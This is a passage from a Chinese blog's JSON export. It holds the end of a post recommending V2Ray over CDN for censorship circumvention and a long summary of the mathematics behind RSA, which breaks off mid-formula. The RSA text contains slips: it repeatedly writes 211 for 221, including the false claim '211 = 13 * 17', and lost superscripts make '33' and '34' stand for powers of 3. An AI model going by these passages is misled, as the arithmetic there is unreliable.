markdown-->","comment_id":"5d6bcbeb3faccd0001d04fb6","plaintext":"之前一直在自己的VPS搭建Shadowsocks服务端做梯子, 不过在一些政治敏感时期, 墙的力度会增强, 前段时间我发现Vultr的所有IP几乎都直接被墙了\n\n经过了解, 决定改用V2Ray搭建一个新的梯子. 我觉得V2Ray最牛逼的一个点是可以将流量伪装成Websocket并通过Cloudflare(CDN)来代理,\n而CDN整个被墙掉的概率很低的 ...\n\n建议使用这个项目 [https://github.com/233boy/v2ray]来搭建V2Ray服务端, 非常好用\n\n速度方面可以接受, Google查个资料, YouTube看个视频基本还是没问题的","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2019-09-01 13:47:23","updated_at":"2019-09-22 08:02:50","published_at":"2019-09-22 08:01:12","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null,"canonical_url":null},{"id":"5d7b12173faccd0001d04fc3","uuid":"51a3251f-45ee-4aa2-8205-228e78345941","title":"读<跨越千年的RSA算法>","slug":"understanding-rsa-algorithm","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"markdown\",{\"markdown\":\"> 原文链接 [跨越千年的RSA算法](https://www.matrix67.com/blog/archives/5100)\"}],[\"markdown\",{\"markdown\":\"在当今这个由互联网构筑的世界里, RSA算法几乎无处不在. 例如:\\n\\n* 访问任何一个`https`证书加密的网站\\n* 通过SSH登录一台服务器\\n* 从GitHub上clone一个项目\\n\\n说来惭愧, 作为一个每天和`RSA算法`打交道的程序员, 直到最近学习了`Matrix67`大神讲解RSA算法的博客我才终于理解`RSA算法`到底是怎么一回事. 在真正介绍`RSA算法`之前作者用了大量的篇幅为读者填补了必要的数学基础, 文章共分为六个小节, 真正提到`RSA算法`的只有最后一个小节, 我之前也看过一两篇其他介绍`RSA算法`的文章, 但唯有这一次让我有种豁然开朗的感觉.\\n\"}],[\"markdown\",{\"markdown\":\"### （一）可公度线段\\n\\n文章介绍了在<几何原本>中一种求取最大公约数的方法(Euclid 算法): 假设刚开始的两个数是 a 和 b ，其中 a > b ，那么把 a 除以 b 的余数记作 c ，把 b 除以 c 的余数记作 d ，c 除以 d 余 e ， d 除以 e 余 f ，等等等等，不断拿上一步的除数去除以上一步的余数。直到某一次除法余数为 0 了，那么此时的除数就是最终结果。因此， Euclid 算法又有一个形象的名字，叫做 `辗转相除法`\"}],[\"markdown\",{\"markdown\":\"###（二）中国剩余定理\\n\\n给出 m 个两两互质的整数，它们的乘积为 P, 假设有一个未知数 M, 如果我们已知 M 分别除以这 m 个数所得的余数, 那么在 0 到 P – 1 的范围内, 我们可以唯一地确定这个 M, 这可以看作是 M 的一个特解. 其他所有满足要求的 M ，则正好是那些除以 P 之后余数等于这个特解的数。\\n\\n`Bézout 定理` 是中国剩余定理的另一种形式. 如果 a 和 n 互质, 那么\\n\\n```\\n  a * x mod n = 1\\n  a * x mod n = 2 \\n  ...\\n  a * x mod n = n-1 \\n```\\n\\n以上所有方程都是有解的\\n\\n如果将第一个等式换成 `中国剩余定理` 的表达, 则可以表达描述为: a 和 n 互质, 那么在 0 到 a*n - 1 的范围内一定存在唯一的M, 使:\\n\\n```\\nM mod a = 0\\nM mod n = 1\\n```\\n\\n这里的 M 相当于上面的 `a * x`\"}],[\"markdown\",{\"markdown\":\"###（三）扩展的辗转相除\\n\\n根据中国剩余定理, 我们可以指定在 0 到 P-1 之间 M 一定有唯一解, 那么如何在已知m和余数的条件下求出这个M呢 ? 这就是 `扩展的辗转相除法`\\n\\n现在, 让我们尝试求解 115x mod 367 = 1, 根据中国剩余定理(或者说Bézout 定理), 由于 115 和 367 是互质的, 因此方程在 0 到 115 * 367 - 1 之间一定存在唯一解.\\n\\n我们解方程的基本思路是，不断寻找 115 的某个倍数以及 367 的某个倍数, 使得它们之间的差越来越小，直到最终变为 1.\\n\\n```\\n由 367 除以 115 得 3 余 22, \\n即 3 个 115 只比 367 少 22, \\n于是 15 个 115 就要比 5 个 367 少 110, \\n从而 16 个 115 就会比 5 个 367 多 5.\\n```\\n\\n好了，真正巧妙的就在这里了: \\n\\n```\\n由 16 个 115 比 5 个 367 多 5, \\n可得 64 个 115 比 20 个 367 多 20\\n结合 3 个 115 比 1 个 367 少 22,\\n可得 67 个 115 比 21 个 367 少 2. \\n```\\n\\n再结合 \\\"少 2\\\" 和 \\\"多 5\\\" 两个式子，\\n\\n```\\n由 67 个 115 比 21 个 367 少 2, \\n可得 134 个 115 比 42 个 367 少 4, \\n结合 16 个 115 比 5 个 367 多 5, \\n可得 150 个 115 比 47 个 367 多 1. \\n```\\n\\n这样，我们就解出了一个满足 115x mod 367 = 1 的 x , 即 x = 150. \\n\\n在求解过程, 我们相当于对 115 和 367 做了一遍辗转相除: 我们不断给出 115 的某个倍数和 367 的某个倍数, 通过辗转对比最近的两个结果, 让它们的差距从\\\"少 22\\\"缩小到\\\"多 5\\\", 再到\\\"少 2\\\", \\\"多 1\\\", 其中 22, 5, 2, 1 这几个数正是用辗转相除法求 115 和 367 的最大公约数时将会经历的数. 因而, 算法的步骤数仍然是对数级别的, 即使面对上百位上千位的大数, 计算机也毫无压力. \\n\\n这种求解方程 a · x mod n = b 的算法就叫做“扩展的辗转相除法”。\"}],[\"markdown\",{\"markdown\":\"### （四）Fermat 小定理\\n\\n1640 年, 法国业余数学家 Pierre de Fermat(通常译作\\\"费马\\\")发现, 如果 n 是一个质数的话, 那么对于任意一个数 a, a 的 n 次方减去 a 之后都将是 n 的倍数. 例如, 7 是一个质数, 于是 2^7 – 2, 3^7 – 3, 4^7 – 4, 甚至 100^7 – 100, 统统都能被 7 整除. 关于费马小定理的证明, 读者可以参见原文.\\n\\nFermat 小定理有一个等价的表述: 如果 n 是一个质数的话, 那么对于任意一个数 a, 随着 i 的增加, a 的 i 次方除以 n 的余数将会呈现出长度为 n – 1 的周期性. \\n\\n为什么呢?\\n\\n根据费马小定理, a^n 与 a 的差能够被 n 整除, 这相当于 a^n 和 a 分别都除以 n 之后将会拥有相同的余数. 另一方面, a^i 除以 n 的余数, 完全由 a^i-1 除以 n 的余数决定, 比方说, 假如我们已经知道 33 除以 7 等于 3 余 6, 这表明 33 里包含 3 个 7 以及 1 个 6. 因此, 34 里就包含 9 个 7 以及 3 个 6, 或者说 9 个 7 以及 1 个 18. 为了得到 34 除以 7 的余数，实际上只需要看看 18 除以 7 余多少就行了. 可见, 要想算出 a^i-1 · a 除以 n 的余数，我们不需要完整地知道 a^i-1 的值, 只需要知道 a^i-1 除以 n 的余数就可以了\\n\\n*重点* 相乘之前事先对乘数取余不会对结果造成影响, 可用数学表达式表示为:\\n\\n```\\n(a * b) % p = (a % p * b % p) % p\\n```\\n\\n这也是取模运算的基本运算法则\\n\\n\\n值得注意的是, n – 1 并不见得是最小的周期. 如 2^i 除以 7 的余数情况, 余数序列确实存在长度为 6 的周期现象, 但实际上它有一个更小的周期 3.\\n\\n假如某个整数 n 等于两个质数 p, q 的乘积，那么对于任意一个整数 a ，写出 a^i 依次除以 n 所得的余数序列, p – 1 和 q – 1 的最小公倍数将成为该序列的一个周期. 事实上， p – 1 和 q – 1 的任意一个公倍数, 比如表达起来最方便的 (p – 1) × (q – 1), 也将成为该序列的一个周期.\"}],[\"markdown\",{\"markdown\":\"### （五）公钥加密的可能性\\n\\n加密算法和解密算法有可能是不对称的吗？\\n\\n小时候我经常在朋友之间表演这么一个数学小魔术: 让对方任意想一个三位数, 把这个三位数乘以 91 的乘积的末三位告诉我, 我便能猜出对方原来想的数是多少. 如果对方心里想的数是 123, 那么对方就计算出 123 × 91 等于 11193, 并把结果的末三位 193 告诉我. 看起来, 这么做似乎损失了不少信息, 让我没法反推出原来的数. 不过, 我仍然有办法: 只需要把对方告诉我的结果再乘以 11, 乘积的末三位就是对方刚开始想的数了. 你可以验证一下， 193 × 11 = 2123 ，末三位正是对方所想的秘密数字! 其实道理很简单, 91 乘以 11 等于 1001, 而任何一个三位数乘以 1001 后, 末三位显然都不变（例如 123 乘以 1001 就等于 123123 ）. 先让对方在他所想的数上乘以 91, 假设乘积为 X, 我再在 X 的基础上乘以 11, 其结果相当于我俩合作把原数乘以了 1001, 自然末三位又变了回去.\\n\\n不过, 加密和解密的过程不对称并不妨碍我们根据加密方法推出解密方法来, 虽然这可能得费些功夫. 比方说, 刚才的加密算法就能被破解: 猜出对方心里想的数相当于求解形如 91x mod 1000 = 193 的方程, 这可以利用扩展的辗转相除法很快求解出来. \\n\\n为了得到一个可以公开加密钥匙的算法, 我们需要一种在只知道加密钥匙的情况下, 构造出解密钥匙非常非常困难的算法。\\n\\n1970 年左右，科学家们开始认真地思考“公钥加密系统”的可能性。 1977 年，来自 MIT 的 Ron Rivest 、 Adi Shamir 和 Leonard Adleman 三个人合写了一篇论文，给出了一种至今仍然安全的公钥加密算法。随后，该算法以三人名字的首字母命名，即 RSA 算法。\\n\\nRSA 算法用到了一种非常犀利的不对称性——大数分解难题.\\n\\n这种不对称性的点在于, 我们可以很容易的判断一个数是否是质数(稍后会讲到), 进而可以很容易的生成一个很大的质数, 但是到目前为止, 我们却没有一种高效的方法, 判断将一个大数分解成两个质数的乘积.\\n\\n判断一个数是否是质数的方法, 可以搜索以下内容: \\n\\n```\\n Fermat 素性测试\\n Miller-Rabin 素性测试\\n AKS 素性测试\\n```\"}],[\"markdown\",{\"markdown\":\"### （六）RSA 算法\\n\\n 所有工作都准备就绪, 下面我们可以开始描述 RSA 算法了.\\n \\n  首先, 找两个质数, 比如说 13 和 17 (实际使用时, 我们会选取大得多的质数). 把它们乘在一起, 得 221. 再计算出 (13 – 1) × (17 – 1) = 192. 根据前面的结论, 任选一个数 a, 它的 i 次方除以 221 的余数将会呈现长度为 192 的周期(虽然可能存在更短的周期). 换句话说, 对于任意的一个 a, a, a^193, a^385, a^577 ... 除以 221 都拥有相同的余数. 注意到, 385 可以写成 11 × 35 ... 嘿嘿，这下我们就又能变数学小魔术了. 叫一个人随便想一个不超过 221 的数，比如 123. 算出 123 的 11 次方除以 221 的余数, 把结果告诉你. 如果他的计算是正确的, 你将会得到 115 这个数. 看上去, 我们似乎很难把 115 还原回去, 但实际上你只需要计算 115 的 35 次方, 它除以 221 的余数就会变回 123. 这是因为, 对方把他所想的数 123 连乘了 11 次, 得到了一个数 X, 你再把这个 X 乘以自身 35 次, 这相当于你们合作把 123 连乘了 385 次, 根据周期性现象, 它除以 221 的余数仍然是 123. 然而, 计算 35 个 X 连乘时, 反正我们要取乘积除以 221 的余数, 因此我们不必完整地获知 X 的值, 只需要知道 X 除以 221 的余数就够了. 因而, 让对方只告诉你 X 取余后的结果, 不会造成信息的丢失.\\n  \\n让我们试想一下, 现在可以公开获取到的信息有 211 和 11, 如果攻击者想要解密数据就必须知道原数据的i次方对211取模的循环周期是多少(即192). 假设 211 是一个很大的数, 我们几乎没有办法把 221 分解成 13 和 17 的乘积. \\n\\n而作为生成秘钥对的一方, 我们知道 211 = 13 * 17, 进而知道原数据的i次方对211取模的循环周期是192, 那么现在, 我们要找出两个数 e 和 d ，使得 e 乘以 d 的结果除以 192 余 1 应该怎么做呢 ? \\n\\n还记得 `中国剩余定理` 吗? \\n\\n上面的问题可以写成数学表达式 `e · d mod 192 = 1`\\n\\n首先, 我们随便找一个和 192 互质的数 (这是可以做到的, 比方说, 可以不断生成小于 192 的质数, 直到找到一个不能整除 192 的为止），把它用作我们的 e (比如 11). 我们知道, 因为 11 和 192 互质, d 的解一定是存在的. \\n\\n让我们用 `扩展的辗转相除法` 再推导一次吧 !\\n\\n```\\n因为 192 除以 11 商 17 余 5,\\n即 17个11 比 1个192 少 5,\\n且 18个11 比 1个192 多 6,\\n那么, 35个11 比 2个192 多 1, 即 11 * 35 除以 192 商 2 余 1\\n```\\n\\n这正是我们需要的结果! d = 35\\n\\n现在, e 和 n 就可以作为加密钥匙公之于众, d 和 n 则是只有自己知道的解密钥匙. 因而，加密钥匙有时也被称作公钥, 解密钥匙有时也被称作私钥. 这就是RSA算法背后的数学原理了, 更多关于RSA算法计算过程中的优化细节可以阅读原文, 也非常我们值得仔细思考.\\n\\n<几何原本> 约于公元前300年由古希腊数学家 `欧几里得` 所著. 伟大的数学思想穿越2300多年的时空, 在今天这个互联网的时代大放异彩.\"}],[\"image\",{\"src\":\"/content/images/2019/09/----.jpg\"}]],\"markups\":[],\"sections\":[[10,0],[10,1],[10,2],[10,3],[10,4],[10,5],[10,6],[10,7],[10,8],[1,\"p\",[]]]}","html":"<!--kg-card-begin: markdown--><blockquote>\n<p>原文链接 <a href=\"https://www.matrix67.com/blog/archives/5100\">跨越千年的RSA算法</a></p>\n</blockquote>\n<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><p>在当今这个由互联网构筑的世界里, RSA算法几乎无处不在. 例如:</p>\n<ul>\n<li>访问任何一个<code>https</code>证书加密的网站</li>\n<li>通过SSH登录一台服务器</li>\n<li>从GitHub上clone一个项目</li>\n</ul>\n<p>说来惭愧, 作为一个每天和<code>RSA算法</code>打交道的程序员, 直到最近学习了<code>Matrix67</code>大神讲解RSA算法的博客我才终于理解<code>RSA算法</code>到底是怎么一回事. 在真正介绍<code>RSA算法</code>之前作者用了大量的篇幅为读者填补了必要的数学基础, 文章共分为六个小节, 真正提到<code>RSA算法</code>的只有最后一个小节, 我之前也看过一两篇其他介绍<code>RSA算法</code>的文章, 但唯有这一次让我有种豁然开朗的感觉.</p>\n<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h3 id=\"\">（一）可公度线段</h3>\n<p>文章介绍了在&lt;几何原本&gt;中一种求取最大公约数的方法(Euclid 算法): 假设刚开始的两个数是 a 和 b ，其中 a &gt; b ，那么把 a 除以 b 的余数记作 c ，把 b 除以 c 的余数记作 d ，c 除以 d 余 e ， d 除以 e 余 f ，等等等等，不断拿上一步的除数去除以上一步的余数。直到某一次除法余数为 0 了，那么此时的除数就是最终结果。因此， Euclid 算法又有一个形象的名字，叫做 <code>辗转相除法</code></p>\n<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h3 id=\"\">（二）中国剩余定理</h3>\n<p>给出 m 个两两互质的整数，它们的乘积为 P, 假设有一个未知数 M, 如果我们已知 M 分别除以这 m 个数所得的余数, 那么在 0 到 P – 1 的范围内, 我们可以唯一地确定这个 M, 这可以看作是 M 的一个特解. 其他所有满足要求的 M ，则正好是那些除以 P 之后余数等于这个特解的数。</p>\n<p><code>Bézout 定理</code> 是中国剩余定理的另一种形式. 如果 a 和 n 互质, 那么</p>\n<pre><code>  a * x mod n = 1\n  a * x mod n = 2 \n  ...\n  a * x mod n = n-1 \n</code></pre>\n<p>以上所有方程都是有解的</p>\n<p>如果将第一个等式换成 <code>中国剩余定理</code> 的表达, 则可以表达描述为: a 和 n 互质, 那么在 0 到 a*n - 1 的范围内一定存在唯一的M, 使:</p>\n<pre><code>M mod a = 0\nM mod n = 1\n</code></pre>\n<p>这里的 M 相当于上面的 <code>a * x</code></p>\n<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h3 id=\"\">（三）扩展的辗转相除</h3>\n<p>根据中国剩余定理, 我们可以指定在 0 到 P-1 之间 M 一定有唯一解, 那么如何在已知m和余数的条件下求出这个M呢 ? 这就是 <code>扩展的辗转相除法</code></p>\n<p>现在, 让我们尝试求解 115x mod 367 = 1, 根据中国剩余定理(或者说Bézout 定理), 由于 115 和 367 是互质的, 因此方程在 0 到 115 * 367 - 1 之间一定存在唯一解.</p>\n<p>我们解方程的基本思路是，不断寻找 115 的某个倍数以及 367 的某个倍数, 使得它们之间的差越来越小，直到最终变为 1.</p>\n<pre><code>由 367 除以 115 得 3 余 22, \n即 3 个 115 只比 367 少 22, \n于是 15 个 115 就要比 5 个 367 少 110, \n从而 16 个 115 就会比 5 个 367 多 5.\n</code></pre>\n<p>好了，真正巧妙的就在这里了:</p>\n<pre><code>由 16 个 115 比 5 个 367 多 5, \n可得 64 个 115 比 20 个 367 多 20\n结合 3 个 115 比 1 个 367 少 22,\n可得 67 个 115 比 21 个 367 少 2. \n</code></pre>\n<p>再结合 &quot;少 2&quot; 和 &quot;多 5&quot; 两个式子，</p>\n<pre><code>由 67 个 115 比 21 个 367 少 2, \n可得 134 个 115 比 42 个 367 少 4, \n结合 16 个 115 比 5 个 367 多 5, \n可得 150 个 115 比 47 个 367 多 1. \n</code></pre>\n<p>这样，我们就解出了一个满足 115x mod 367 = 1 的 x , 即 x = 150.</p>\n<p>在求解过程, 我们相当于对 115 和 367 做了一遍辗转相除: 我们不断给出 115 的某个倍数和 367 的某个倍数, 通过辗转对比最近的两个结果, 让它们的差距从&quot;少 22&quot;缩小到&quot;多 5&quot;, 再到&quot;少 2&quot;, &quot;多 1&quot;, 其中 22, 5, 2, 1 这几个数正是用辗转相除法求 115 和 367 的最大公约数时将会经历的数. 因而, 算法的步骤数仍然是对数级别的, 即使面对上百位上千位的大数, 计算机也毫无压力.</p>\n<p>这种求解方程 a · x mod n = b 的算法就叫做“扩展的辗转相除法”。</p>\n<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h3 id=\"fermat\">（四）Fermat 小定理</h3>\n<p>1640 年, 法国业余数学家 Pierre de Fermat(通常译作&quot;费马&quot;)发现, 如果 n 是一个质数的话, 那么对于任意一个数 a, a 的 n 次方减去 a 之后都将是 n 的倍数. 例如, 7 是一个质数, 于是 2^7 – 2, 3^7 – 3, 4^7 – 4, 甚至 100^7 – 100, 统统都能被 7 整除. 关于费马小定理的证明, 读者可以参见原文.</p>\n<p>Fermat 小定理有一个等价的表述: 如果 n 是一个质数的话, 那么对于任意一个数 a, 随着 i 的增加, a 的 i 次方除以 n 的余数将会呈现出长度为 n – 1 的周期性.</p>\n<p>为什么呢?</p>\n<p>根据费马小定理, a^n 与 a 的差能够被 n 整除, 这相当于 a^n 和 a 分别都除以 n 之后将会拥有相同的余数. 另一方面, a^i 除以 n 的余数, 完全由 a^i-1 除以 n 的余数决定, 比方说, 假如我们已经知道 33 除以 7 等于 3 余 6, 这表明 33 里包含 3 个 7 以及 1 个 6. 因此, 34 里就包含 9 个 7 以及 3 个 6, 或者说 9 个 7 以及 1 个 18. 为了得到 34 除以 7 的余数，实际上只需要看看 18 除以 7 余多少就行了. 可见, 要想算出 a^i-1 · a 除以 n 的余数，我们不需要完整地知道 a^i-1 的值, 只需要知道 a^i-1 除以 n 的余数就可以了</p>\n<p><em>重点</em> 相乘之前事先对乘数取余不会对结果造成影响, 可用数学表达式表示为:</p>\n<pre><code>(a * b) % p = (a % p * b % p) % p\n</code></pre>\n<p>这也是取模运算的基本运算法则</p>\n<p>值得注意的是, n – 1 并不见得是最小的周期. 如 2^i 除以 7 的余数情况, 余数序列确实存在长度为 6 的周期现象, 但实际上它有一个更小的周期 3.</p>\n<p>假如某个整数 n 等于两个质数 p, q 的乘积，那么对于任意一个整数 a ，写出 a^i 依次除以 n 所得的余数序列, p – 1 和 q – 1 的最小公倍数将成为该序列的一个周期. 事实上， p – 1 和 q – 1 的任意一个公倍数, 比如表达起来最方便的 (p – 1) × (q – 1), 也将成为该序列的一个周期.</p>\n<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h3 id=\"\">（五）公钥加密的可能性</h3>\n<p>加密算法和解密算法有可能是不对称的吗？</p>\n<p>小时候我经常在朋友之间表演这么一个数学小魔术: 让对方任意想一个三位数, 把这个三位数乘以 91 的乘积的末三位告诉我, 我便能猜出对方原来想的数是多少. 如果对方心里想的数是 123, 那么对方就计算出 123 × 91 等于 11193, 并把结果的末三位 193 告诉我. 看起来, 这么做似乎损失了不少信息, 让我没法反推出原来的数. 不过, 我仍然有办法: 只需要把对方告诉我的结果再乘以 11, 乘积的末三位就是对方刚开始想的数了. 你可以验证一下， 193 × 11 = 2123 ，末三位正是对方所想的秘密数字! 其实道理很简单, 91 乘以 11 等于 1001, 而任何一个三位数乘以 1001 后, 末三位显然都不变（例如 123 乘以 1001 就等于 123123 ）. 先让对方在他所想的数上乘以 91, 假设乘积为 X, 我再在 X 的基础上乘以 11, 其结果相当于我俩合作把原数乘以了 1001, 自然末三位又变了回去.</p>\n<p>不过, 加密和解密的过程不对称并不妨碍我们根据加密方法推出解密方法来, 虽然这可能得费些功夫. 比方说, 刚才的加密算法就能被破解: 猜出对方心里想的数相当于求解形如 91x mod 1000 = 193 的方程, 这可以利用扩展的辗转相除法很快求解出来.</p>\n<p>为了得到一个可以公开加密钥匙的算法, 我们需要一种在只知道加密钥匙的情况下, 构造出解密钥匙非常非常困难的算法。</p>\n<p>1970 年左右，科学家们开始认真地思考“公钥加密系统”的可能性。 1977 年，来自 MIT 的 Ron Rivest 、 Adi Shamir 和 Leonard Adleman 三个人合写了一篇论文，给出了一种至今仍然安全的公钥加密算法。随后，该算法以三人名字的首字母命名，即 RSA 算法。</p>\n<p>RSA 算法用到了一种非常犀利的不对称性——大数分解难题.</p>\n<p>这种不对称性的点在于, 我们可以很容易的判断一个数是否是质数(稍后会讲到), 进而可以很容易的生成一个很大的质数, 但是到目前为止, 我们却没有一种高效的方法, 判断将一个大数分解成两个质数的乘积.</p>\n<p>判断一个数是否是质数的方法, 可以搜索以下内容:</p>\n<pre><code> Fermat 素性测试\n Miller-Rabin 素性测试\n AKS 素性测试\n</code></pre>\n<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h3 id=\"rsa\">（六）RSA 算法</h3>\n<p>所有工作都准备就绪, 下面我们可以开始描述 RSA 算法了.</p>\n<p>首先, 找两个质数, 比如说 13 和 17 (实际使用时, 我们会选取大得多的质数). 把它们乘在一起, 得 221. 再计算出 (13 – 1) × (17 – 1) = 192. 根据前面的结论, 任选一个数 a, 它的 i 次方除以 221 的余数将会呈现长度为 192 的周期(虽然可能存在更短的周期). 换句话说, 对于任意的一个 a, a, a^193, a^385, a^577 ... 除以 221 都拥有相同的余数. 注意到, 385 可以写成 11 × 35 ... 嘿嘿，这下我们就又能变数学小魔术了. 叫一个人随便想一个不超过 221 的数，比如 123. 算出 123 的 11 次方除以 221 的余数, 把结果告诉你. 如果他的计算是正确的, 你将会得到 115 这个数. 看上去, 我们似乎很难把 115 还原回去, 但实际上你只需要计算 115 的 35 次方, 它除以 221 的余数就会变回 123. 这是因为, 对方把他所想的数 123 连乘了 11 次, 得到了一个数 X, 你再把这个 X 乘以自身 35 次, 这相当于你们合作把 123 连乘了 385 次, 根据周期性现象, 它除以 221 的余数仍然是 123. 然而, 计算 35 个 X 连乘时, 反正我们要取乘积除以 221 的余数, 因此我们不必完整地获知 X 的值, 只需要知道 X 除以 221 的余数就够了. 因而, 让对方只告诉你 X 取余后的结果, 不会造成信息的丢失.</p>\n<p>让我们试想一下, 现在可以公开获取到的信息有 211 和 11, 如果攻击者想要解密数据就必须知道原数据的i次方对211取模的循环周期是多少(即192). 假设 211 是一个很大的数, 我们几乎没有办法把 221 分解成 13 和 17 的乘积.</p>\n<p>而作为生成秘钥对的一方, 我们知道 211 = 13 * 17, 进而知道原数据的i次方对211取模的循环周期是192, 那么现在, 我们要找出两个数 e 和 d ，使得 e 乘以 d 的结果除以 192 余 1 应该怎么做呢 ?</p>\n<p>还记得 <code>中国剩余定理</code> 吗?</p>\n<p>上面的问题可以写成数学表达式 <code>e · d mod 192 = 1</code></p>\n<p>首先, 我们随便找一个和 192 互质的数 (这是可以做到的, 比方说, 可以不断生成小于 192 的质数, 直到找到一个不能整除 192 的为止），把它用作我们的 e (比如 11). 我们知道, 因为 11 和 192 互质, d 的解一定是存在的.</p>\n<p>让我们用 <code>扩展的辗转相除法</code> 再推导一次吧 !</p>\n<pre><code>因为 192 除以 11 商 17 余 5,\n即 17个11 比 1个192 少 5,\n且 18个11 比 1个192 多 6,\n那么, 35个11 比 2个192 多 1, 即 11 * 35 除以 192 商 2 余 1\n</code></pre>\n<p>这正是我们需要的结果! d = 35</p>\n<p>现在, e 和 n 就可以作为加密钥匙公之于众, d 和 n 则是只有自己知道的解密钥匙. 因而，加密钥匙有时也被称作公钥, 解密钥匙有时也被称作私钥. 这就是RSA算法背后的数学原理了, 更多关于RSA算法计算过程中的优化细节可以阅读原文, 也非常我们值得仔细思考.</p>\n<p>&lt;几何原本&gt; 约于公元前300年由古希腊数学家 <code>欧几里得</code> 所著. 伟大的数学思想穿越2300多年的时空, 在今天这个互联网的时代大放异彩.</p>\n<!--kg-card-end: markdown--><!--kg-card-begin: image--><figure class=\"kg-card kg-image-card\"><img src=\"/content/images/2019/09/----.jpg\" class=\"kg-image\"></figure><!--kg-card-end: image-->","comment_id":"5d7b12173faccd0001d04fc3","plaintext":"> 原文链接 跨越千年的RSA算法 [https://www.matrix67.com/blog/archives/5100]\n\n\n在当今这个由互联网构筑的世界里, RSA算法几乎无处不在. 例如:\n\n * 访问任何一个https证书加密的网站\n * 通过SSH登录一台服务器\n * 从GitHub上clone一个项目\n\n说来惭愧, 作为一个每天和RSA算法打交道的程序员, 直到最近学习了Matrix67大神讲解RSA算法的博客我才终于理解RSA算法到底是怎么一回事. 在真正介绍\nRSA算法之前作者用了大量的篇幅为读者填补了必要的数学基础, 文章共分为六个小节, 真正提到RSA算法的只有最后一个小节, 我之前也看过一两篇其他介绍RSA算法\n的文章, 但唯有这一次让我有种豁然开朗的感觉.\n\n（一）可公度线段\n文章介绍了在<几何原本>中一种求取最大公约数的方法(Euclid 算法): 假设刚开始的两个数是 a 和 b ，其中 a > b ，那么把 a 除以 b\n的余数记作 c ，把 b 除以 c 的余数记作 d ，c 除以 d 余 e ， d 除以 e 余 f\n，等等等等，不断拿上一步的除数去除以上一步的余数。直到某一次除法余数为 0 了，那么此时的除数就是最终结果。因此， Euclid 算法又有一个形象的名字，叫做 \n辗转相除法\n\n（二）中国剩余定理\n给出 m 个两两互质的整数，它们的乘积为 P, 假设有一个未知数 M, 如果我们已知 M 分别除以这 m 个数所得的余数, 那么在 0 到 P – 1\n的范围内, 我们可以唯一地确定这个 M, 这可以看作是 M 的一个特解. 其他所有满足要求的 M ，则正好是那些除以 P 之后余数等于这个特解的数。\n\nBézout 定理  是中国剩余定理的另一种形式. 如果 a 和 n 互质, 那么\n\n  a * x mod n = 1\n  a * x mod n = 2 \n  ...\n  a * x mod n = n-1 \n\n\n以上所有方程都是有解的\n\n如果将第一个等式换成 中国剩余定理  的表达, 则可以表达描述为: a 和 n 互质, 那么在 0 到 a*n - 1 的范围内一定存在唯一的M, 使:\n\nM mod a = 0\nM mod n = 1\n\n\n这里的 M 相当于上面的 a * x\n\n（三）扩展的辗转相除\n根据中国剩余定理, 我们可以指定在 0 到 P-1 之间 M 一定有唯一解, 那么如何在已知m和余数的条件下求出这个M呢 ? 这就是 扩展的辗转相除法\n\n现在, 让我们尝试求解 115x mod 367 = 1, 根据中国剩余定理(或者说Bézout 定理), 由于 115 和 367 是互质的, 因此方程在 0\n到 115 * 367 - 1 之间一定存在唯一解.\n\n我们解方程的基本思路是，不断寻找 115 的某个倍数以及 367 的某个倍数, 使得它们之间的差越来越小，直到最终变为 1.\n\n由 367 除以 115 得 3 余 22, \n即 3 个 115 只比 367 少 22, \n于是 15 个 115 就要比 5 个 367 少 110, \n从而 16 个 115 就会比 5 个 367 多 5.\n\n\n好了，真正巧妙的就在这里了:\n\n由 16 个 115 比 5 个 367 多 5, \n可得 64 个 115 比 20 个 367 多 20\n结合 3 个 115 比 1 个 367 少 22,\n可得 67 个 115 比 21 个 367 少 2. \n\n\n再结合 \"少 2\" 和 \"多 5\" 两个式子，\n\n由 67 个 115 比 21 个 367 少 2, \n可得 134 个 115 比 42 个 367 少 4, \n结合 16 个 115 比 5 个 367 多 5, \n可得 150 个 115 比 47 个 367 多 1. \n\n\n这样，我们就解出了一个满足 115x mod 367 = 1 的 x , 即 x = 150.\n\n在求解过程, 我们相当于对 115 和 367 做了一遍辗转相除: 我们不断给出 115 的某个倍数和 367 的某个倍数, 通过辗转对比最近的两个结果,\n让它们的差距从\"少 22\"缩小到\"多 5\", 再到\"少 2\", \"多 1\", 其中 22, 5, 2, 1 这几个数正是用辗转相除法求 115 和 367\n的最大公约数时将会经历的数. 因而, 算法的步骤数仍然是对数级别的, 即使面对上百位上千位的大数, 计算机也毫无压力.\n\n这种求解方程 a · x mod n = b 的算法就叫做“扩展的辗转相除法”。\n\n（四）Fermat 小定理\n1640 年, 法国业余数学家 Pierre de Fermat(通常译作\"费马\")发现, 如果 n 是一个质数的话, 那么对于任意一个数 a, a 的 n\n次方减去 a 之后都将是 n 的倍数. 例如, 7 是一个质数, 于是 2^7 – 2, 3^7 – 3, 4^7 – 4, 甚至 100^7 – 100,\n统统都能被 7 整除. 关于费马小定理的证明, 读者可以参见原文.\n\nFermat 小定理有一个等价的表述: 如果 n 是一个质数的话, 那么对于任意一个数 a, 随着 i 的增加, a 的 i 次方除以 n\n的余数将会呈现出长度为 n – 1 的周期性.\n\n为什么呢?\n\n根据费马小定理, a^n 与 a 的差能够被 n 整除, 这相当于 a^n 和 a 分别都除以 n 之后将会拥有相同的余数. 另一方面, a^i 除以 n\n的余数, 完全由 a^i-1 除以 n 的余数决定, 比方说, 假如我们已经知道 33 除以 7 等于 3 余 6, 这表明 33 里包含 3 个 7 以及 1\n个 6. 因此, 34 里就包含 9 个 7 以及 3 个 6, 或者说 9 个 7 以及 1 个 18. 为了得到 34 除以 7 的余数，实际上只需要看看\n18 除以 7 余多少就行了. 可见, 要想算出 a^i-1 · a 除以 n 的余数，我们不需要完整地知道 a^i-1 的值, 只需要知道 a^i-1 除以\nn 的余数就可以了\n\n重点  相乘之前事先对乘数取余不会对结果造成影响, 可用数学表达式表示为:\n\n(a * b) % p = (a % p * b % p) 